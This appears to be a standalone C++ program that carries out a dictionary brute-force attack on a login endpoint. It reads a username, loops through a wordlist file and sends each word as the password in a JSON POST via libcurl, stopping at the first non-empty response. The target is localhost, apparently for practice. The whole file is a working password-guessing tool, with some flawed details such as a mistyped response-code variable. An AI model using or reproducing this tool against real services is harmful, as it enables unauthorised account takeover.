#include <iostream>
#include <string>
#include <curl/curl.h>
#include <stdio.h>
#include <stdlib.h>



using namespace std;

string readBuffer;
CURL *curl;
CURLcode res;

int SUCCESS = 200;
int ERROR = 0;

int *response_code;

static size_t WriteCallback(void *contents, size_t size, size_t nmemb, void *userp)
{
    ((std::string*)userp)->append((char*)contents, size * nmemb);
    return size * nmemb;
}

void make_post_req(string username,string password) {

    string temp = "{\n    \"username\": \""+username+"\",\n    \"password\" : \""+password+"\"\n\n}";
    
    cout << temp << endl;

    char *data = new char[temp.size()+1];
    copy(temp.begin(), temp.end(), data);
    data[temp.size()] = '\0';


    curl = curl_easy_init();
    if(curl) {

        
      curl_easy_setopt(curl, CURLOPT_CUSTOMREQUEST, "POST");
      curl_easy_setopt(curl, CURLOPT_URL, "localhost:3000/login");
        
      struct curl_slist *headers = NULL;
      headers = curl_slist_append(headers, "Content-Type: application/json");
        
      curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
      curl_easy_setopt(curl, CURLOPT_POSTFIELDS, data);

      curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
      curl_easy_setopt(curl, CURLOPT_WRITEDATA, &readBuffer);
      
      res = curl_easy_perform(curl);
      curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &response_code );
      curl_easy_cleanup(curl);
      
    }

}



int main(void) {
    
    string user;
    cout << "Enter username : ";
    cin >> user;
    

  
  freopen("dictionary.txt","r",stdin);
    
  int Size = 466551;
    
    while(Size--) {
        string pass;
        cin>>pass;
   
        make_post_req(user,pass);
        
        
    
        
        if ( readBuffer.length() != ERROR  ) {
            
            cout << endl << "Response code : " << response_code << endl;
            cout << readBuffer << endl;
            
            break;
        }

        readBuffer.clear();
        
        
    }
    
    
    cout  << endl << " ---- end ---- " << endl;
    
    

  return 0;
}
